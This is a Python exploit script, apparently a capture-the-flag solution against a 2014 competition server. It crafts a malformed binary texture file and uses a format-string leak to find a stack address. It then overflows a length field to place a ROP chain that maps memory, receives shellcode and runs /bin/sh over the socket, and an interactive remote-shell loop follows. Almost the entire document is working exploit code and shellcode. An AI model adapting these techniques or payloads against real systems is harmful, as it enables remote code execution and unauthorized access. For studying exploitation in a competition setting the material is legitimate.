import sys, os
import struct
import socket
import binascii
import time

LODCount = 0
TotalDataLen = 0
CurID = 0

def GetJFESize(Entry):
	return 8 + 2 + len(Entry["Name"]) + len(Entry["Data"])

def GetJFWSize(Entry):
	DataLen = 8 + 3 + len(Entry["Name"]) + 1
	for TLV in Entry["Links"]:
		DataLen += GetSize(TLV)
	return DataLen

def GetJFWLSize(Entry):
	return 8 + (len(Entry["Links"]) * 4)

def GetJFDSize(Entry):
	DataLen = 8 + 2 + len(Entry["Name"]) + 1
	for I in Entry["Files"]:
		DataLen += GetSize(I)

	return DataLen

def GetJFMSize(Entry):
	return 8 + 2 + len(Entry["Name"]) + 1 + 4 + len(Entry["Data"])

def GetJFTSize(Entry):
	DataLen = 8 + 1 + len(Entry["Name"]) + 1 + 1
	for LOD in Entry["LOD"]:
		DataLen += GetSize(LOD)
	return DataLen

def GetJTLSize(Entry):
	return 8 + 4 + 4 + len(Entry["Data"])

def GetJMESize(Entry):
	DataLen = 8 + 1 + 2 + len(Entry["Name"]) + 1
	for LOD in Entry["LOD"]:
		DataLen += GetSize(LOD)
	return DataLen

def GetJMLSize(Entry):
	return 8 + len(Entry["Data"])

def GetJFSSize(Entry):
	return 8 + 1 + len(Entry["Data"]) + len(Entry["Name"]) + 1

def GetJBSPSize(Entry):
	return 12 + GetSize(Entry["Root"])

def GetSize(TLV):
	SizeFuncs = dict()
	SizeFuncs["JFE"] = GetJFESize
	SizeFuncs["JFW"] = GetJFWSize
	SizeFuncs["JFWL"] = GetJFWLSize
	SizeFuncs["JFD"] = GetJFDSize
	SizeFuncs["JFM"] = GetJFMSize
	SizeFuncs["JFT"] = GetJFTSize
	SizeFuncs["JTL"] = GetJTLSize
	SizeFuncs["JME"] = GetJMESize
	SizeFuncs["JML"] = GetJMLSize
	SizeFuncs["JFS"] = GetJFSSize
	SizeFuncs["JBSP"] = GetJBSPSize
	return SizeFuncs[TLV["Type"]](TLV)

def CreateJFE(Name, Data):
	TLV = dict()
	TLV["Type"] = "JFE"
	TLV["Name"] = Name
	TLV["Data"] = Data
	return TLV

def CreateJFW(Name):
	TLV = dict()
	TLV["Type"] = "JFW"
	TLV["Name"] = Name
	TLV["Links"] = []
	return TLV

def AddJFWL(JFW):
	TLV = dict()
	TLV["Type"] = "JFWL"
	TLV["Links"] = []
	JFW["Links"].append(TLV)
	return TLV

def AddToJFWL(JFWL, Entry):
	JFWL["Links"].append(Entry)

def CreateJFD(Name):
	TLV = dict()
	TLV["Type"] = "JFD"
	TLV["Name"] = Name
	TLV["Files"] = []
	return TLV

def AddToJFD(JFD, File):
	JFD["Files"].append(File)

def CreateJFM(SubType, Name, TimeLength, Data):
	TLV = dict()
	TLV["Type"] = "JFM"
	TLV["SubType"] = SubType
	TLV["Name"] = Name
	TLV["TimeLength"] = TimeLength
	TLV["Data"] = Data
	return TLV

def CreateJFT(SubType, Name, ExtraLOD = 0):
	TLV = dict()
	TLV["Type"] = "JFT"
	TLV["SubType"] = SubType
	TLV["Name"] = Name
	TLV["LOD"] = []
	TLV["ExtraLOD"] = ExtraLOD
	return TLV

def CreateJTL(Width, Height, Data, BadSize = 0):
	global LODVal
	TLV = dict()
	TLV["Type"] = "JTL"
	TLV["Width"] = Width
	TLV["Height"] = Height
	TLV["Data"] = Data
	TLV["BadSize"] = BadSize
	LODVal = 1
	return TLV

def AddJTL(JFT, Width, Height, Data, BadSize = 0):
	TLV = dict()
	TLV["Type"] = "JTL"
	TLV["Width"] = Width
	TLV["Height"] = Height
	TLV["Data"] = Data
	TLV["BadSize"] = BadSize
	JFT["LOD"].append(TLV)

def CreateJME(SubType, Name):
	TLV = dict()
	TLV["Type"] = "JME"
	TLV["SubType"] = SubType
	TLV["Name"] = Name
	TLV["LOD"] = []
	return TLV

def AddJML(JME, Data):
	TLV = dict()
	TLV["Type"] = "JML"
	TLV["Data"] = Data
	JME["LOD"].append(TLV)

def CreateJFS(SubType, Name, Data):
	TLV = dict()
	TLV["Type"] = "JFS"
	TLV["SubType"] = SubType
	TLV["Name"] = Name
	TLV["Data"] = Data
	return TLV

def CreateJBSP(Root):
	TLV = dict()
	TLV["Type"] = "JBSP"
	TLV["Root"] = Root
	return TLV

def WriteJFD(Entry):
	Data = WriteVal(struct.unpack("<I", "JFD\0")[0], 4) + WriteVal(GetSize(Entry), 4) + WriteVal(len(Entry["Name"]) + 1, 2) + Entry["Name"] + "\0"
	for i in Entry["Files"]:
		Data += WriteEntry(i)
	return Data

def WriteJFE(Entry):
	return WriteVal(struct.unpack("<I", "JFE\0")[0], 4) + WriteVal(GetSize(Entry), 4) + WriteVal(len(Entry["Name"]), 2) + Entry["Name"] + Entry["Data"]

def WriteJFS(Entry):
	return WriteVal(struct.unpack("<I", "JFS" + chr(Entry["SubType"]))[0], 4) + WriteVal(GetSize(Entry), 4) + WriteVal(len(Entry["Name"]), 1) + Entry["Data"] + Entry["Name"] + "\0"

def WriteJME(Entry):
	global LODVal

	Data = WriteVal(struct.unpack("<I", "JME" + chr(Entry["SubType"]))[0], 4) + WriteVal(GetSize(Entry), 4) + WriteVal(len(Entry["LOD"]), 1) + WriteVal(len(Entry["Name"]) + 1, 2) + Entry["Name"] + "\0"
	LODVal = 0
	for i in Entry["LOD"]:
		LODVal += 1
		Data += WriteEntry(i)
	return Data

def WriteJML(Entry):
	return WriteVal(struct.unpack("<I", "JML" + str(LODVal))[0], 4) + WriteVal(GetSize(Entry), 4) + Entry["Data"]

def WriteJFT(Entry):
	global LODVal

	Data = WriteVal(struct.unpack("<I", "JFT" + chr(Entry["SubType"]))[0], 4) + WriteVal(GetSize(Entry), 4) + WriteVal(len(Entry["Name"]) + 1, 1) + Entry["Name"] + "\0" + WriteVal(len(Entry["LOD"]) + Entry["ExtraLOD"], 1)
	LODVal = 0
	for i in Entry["LOD"]:
		LODVal += 1
		Data += WriteEntry(i)
	return Data

def WriteJTL(Entry):
	if(Entry["BadSize"] == 0):
		SetSize = GetSize(Entry)
	else:
		SetSize = Entry["BadSize"]
	return WriteVal(struct.unpack("<I", "JTL" + chr(LODVal))[0], 4) + WriteVal(SetSize, 4) + WriteVal(Entry["Width"], 4) + WriteVal(Entry["Height"], 4) + Entry["Data"]

def WriteJFM(Entry):
	return WriteVal(struct.unpack("<I", "JFM" + chr(Entry["SubType"]))[0], 4) + WriteVal(GetSize(Entry), 4) + WriteVal(len(Entry["Name"]), 2) + Entry["Name"] + "\0" + WriteVal(struct.unpack("<I", struct.pack("<f", Entry["TimeLength"]))[0], 4) + Entry["Data"]

def WriteJFW(Entry):
	Data = WriteVal(struct.unpack("<I", "JFW0")[0], 4) + WriteVal(GetSize(Entry), 4) + WriteVal(len(Entry["Name"]), 3) + Entry["Name"] + "\0"
	for i in Entry["Links"]:
		Data += WriteEntry(i)
	return Data

def WriteJFWL(Entry):
	Data = WriteVal(struct.unpack("<I", "JFWL")[0], 4) + WriteVal(GetSize(Entry), 4)
	for Link in Entry["Links"]:
		if "DataPos" in Link:
			Data += WriteVal(Link["ID"], 4)
		else:
			Data += "\0\0\0\0"
	return Data

def WriteJBSP(Entry):
	return WriteVal(struct.unpack("<I", "JBSP")[0], 4) + WriteVal(GetSize(Entry), 4) + WriteVal(1, 4) + WriteEntry(Entry["Root"])

def WriteEntry(Entry):
	global TotalDataLen, CurID

	Entry["DataPos"] = TotalDataLen
	Entry["ID"] = CurID

	WriteFuncs = dict()
	WriteFuncs["JBSP"] = WriteJBSP
	WriteFuncs["JFE"] = WriteJFE
	WriteFuncs["JFW"] = WriteJFW
	WriteFuncs["JFWL"] = WriteJFWL
	WriteFuncs["JFD"] = WriteJFD
	WriteFuncs["JFM"] = WriteJFM
	WriteFuncs["JFT"] = WriteJFT
	WriteFuncs["JTL"] = WriteJTL
	WriteFuncs["JME"] = WriteJME
	WriteFuncs["JML"] = WriteJML
	WriteFuncs["JFS"] = WriteJFS
	Data = WriteFuncs[Entry["Type"]](Entry)
	TotalDataLen += len(Data)
	CurID += 1

	return Data

ByteOrder = 1

def WriteVal(Val, Len):
	global ByteOrder
	if(ByteOrder):
		DataOut = struct.pack("<I", Val)
		DataOut = DataOut[0:Len]
	else:
		DataOut = struct.pack(">I", Val)
		DataOut = DataOut[4-Len:4]

	ByteOrder ^= 1
	return DataOut

def GetMenu(sock, data = ""):
	if("CMD>" in data):
		return

	while(1):
		data = sock.recv(4096)
		#if len(data):
		#	print data
		if("CMD>" in data):
			break
	return

def PrintData(sock):
	Match = False
	datacopy = []
	while(not Match):
		data = sock.recv(4096).split("\n")
		datacopy += data[:]
		while(len(data)):
			Entry = data.pop(0)
			if(Entry[0:6] == "======"):
				Match = True
				break
			else:
				#print Entry
				pass
	return (Entry + "\n" + "\n".join(data), datacopy)


sock = socket.create_connection(("bytesexual.2014.ghostintheshellcode.com", 4334))
GetMenu(sock)

sock.send("1\n")

Root = CreateJFD("Root")
JFT = CreateJFT(1, "Texture 1", 1)

PercentX = "%d " * 16 + "\0"
BadSize = 0xffffffe0
DirectoryString = 0x0804C3C4
AddJTL(JFT, 10, DirectoryString, PercentX, BadSize)

#create an entry to mask out the bad entry so we can continue parsing
JTLData = WriteEntry(CreateJTL(1, 1, "1"*(GetJFTSize(JFT) - 4)))[0:12]

AddToJFD(Root, CreateJFE("1", ""))
AddToJFD(Root, CreateJFE("1" * len(PercentX), JTLData))
AddToJFD(Root, JFT)

TotalDataLen = 0
CurID = 0
ByteOrder = 1
Data = WriteEntry(CreateJBSP(Root))

sock.send(struct.pack("<I", len(Data)))

print "%d bytes of data being sent" % (len(Data))
sock.send(Data)
GetMenu(sock)

sock.send("3\n")
(menudata, data) = PrintData(sock)
GetMenu(sock, menudata)


#find our hex values
for i in xrange(0, len(data)):
	if "JBSP Version" in data[i]:
		DataSplit = data[i+1].split(" ")
		if len(DataSplit) >= 16:
			StackVal = int(DataSplit[15]) & 0xffffffff
			print "Stack:", hex(StackVal)
			break


"""
080483B3
--
retf

08048386
--
pop eax
pop esi
pop edi
pop ecx
pop edx
pop ebx
retf

0804A5F4
--
pop ebx
pop esi
pop edi
pop ebp
retn


mmap - 080481AD
subl	$20, %esp
movl	%ebx, 4(%esp)
movl	%esi, 8(%esp)
movl	%edi, 12(%esp)
movl	%edx, (%esp)
mov %eax, %edi
mov %edx, %esi
mov %ecx, %edx
mov 28(%esp), %r10d
xor %r8, %r8
sub $1, %r8
xor %r9, %r9
mov $9, %eax
syscall
movl	(%esp), %edx
movl	4(%esp), %ebx
movl	8(%esp), %esi
movl	12(%esp), %edi
addl	$20, %esp
lret

recv - 08048383
#[esp+00h] = fd
#[esp+04h] = buffer
#[esp+08h] = len
#[esp+0Ch] = 0
mov $10, %ebx
mov %esp, %ecx
mov $102, %eax
int $0x80
addl	$32, %esp
popl	%ebx
ret
"""

mmap = 0x080481C0
recv = 0x080483A8
large_pop_retf = 0x080483DE
pop_ret = 0x080483BB
retf = large_pop_retf + 6

fd = 4
shellcode = ("SVWU\x8b\xec\x8dd$\xf8\xe8\x00\x00\x00\x00_\x8d\x7f\xf13\xf6\x83\xfe\x03|\x02"
	"\xeb\x11j?Xj" + chr(fd) + "[\x8b\xce\xcd\x80\x8b\xc6\x83\xc6\x01\xeb\xe8\x8dGL\x89E"
	"\xf8j\x00\x8fE\xfc\x8bU\xf8\x8dM\xf8j\x0bX\x8b\xda3\xd2\xcd\x80\xc9_^[\xc3"
	"/bin/sh\x00")
StackData = struct.pack("<II", retf, 0)
StackData += struct.pack("<II", large_pop_retf, 0x23)
StackData += struct.pack("<IIIIIIII", 0x41410000, 0, 0, 7, 0x1000, 0, mmap, 0x33)
StackData += struct.pack("<III", pop_ret, 0x23, 0x62)
StackData += struct.pack("<I", recv)
StackData += struct.pack("<IIIIIIIIII", fd, 0x41410000, len(shellcode), 0, 0, 0, 0, 0, 0, 0x41410000)

StackVal = StackVal - 0x970

Root = CreateJFD("Root Folder")
JFT = CreateJFT(1, "Texture 1")
AddJTL(JFT, 10, StackVal, StackData, BadSize)

#create an entry to mask out the bad entry so we can continue parsing
#AddToJFD(Root, CreateJFE("1", ""))
AddToJFD(Root, CreateJFE("1" * len(StackData), ""))
AddToJFD(Root, JFT)

TotalDataLen = 0
CurID = 0
ByteOrder = 1
Data = WriteEntry(Root)

sock.send("4\n")
sock.recv(4096)
sock.send("Root\n")
sock.recv(4096)
sock.send(Data)
sock.recv(4096)
sock.send(shellcode)
sock.recv(4096)

print "Incoming shell"

# Awesome Shell shamelessly stolen from Eindbazen
# connect stdio to socket until either EOF's. use low-level calls to bypass stdin buffering.
# also change the tty to character mode so we can have line editing and tab completion.
import termios, tty, select, os
old_settings = termios.tcgetattr(0)
try:
    tty.setcbreak(0)
    c = True
    while c:
        for i in select.select([0, sock.fileno()], [], [], 0)[0]:
            c = os.read(i, 1024)
            if c: os.write(sock.fileno() if i == 0 else 1, c)
except KeyboardInterrupt: pass
finally: termios.tcsetattr(0, termios.TCSADRAIN, old_settings)
sock.close()

